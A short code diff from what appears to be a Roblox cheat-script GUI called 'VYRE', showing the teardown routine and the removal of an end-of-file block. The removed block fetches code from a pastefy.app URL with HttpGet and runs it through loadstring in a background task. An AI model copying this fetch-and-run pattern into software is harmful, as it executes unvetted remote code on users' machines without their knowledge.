@@ -4083,15 +4083,3 @@ local function stopAll()
 end
 UI.SG.Destroying:Connect(stopAll)
 if getgenv then getgenv().VYREStop = stopAll end
-
--- ============================================================
--- EXTERNAL LOADSTRING (last mein)
--- ============================================================
-task.spawn(function()
-    local ok, err = pcall(function()
-        loadstring(game:HttpGet("https://pastefy.app/BauFvHMR/raw"))()
-    end)
-    if not ok then
-        warn("[VYRE] External script failed:", err)
-    end
-end)
